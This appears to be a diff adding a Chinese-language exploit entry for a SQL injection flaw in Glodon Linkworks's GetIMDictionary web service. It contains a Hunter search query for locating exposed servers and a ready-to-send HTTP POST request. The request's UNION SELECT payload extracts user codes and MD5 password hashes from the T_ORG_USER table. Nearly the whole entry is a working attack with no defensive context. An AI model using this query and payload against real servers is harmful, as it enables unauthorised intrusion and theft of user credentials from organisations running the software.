@@ -1,0 +1,15 @@
+# 广联达 Linkworks GetIMDictionary SQL注入漏洞
+
+## 网络测绘
+
+hunter: web.body="/Services/Identification/"
+
+## POC / EXP
+
+```
+POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded
+
+key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
+```
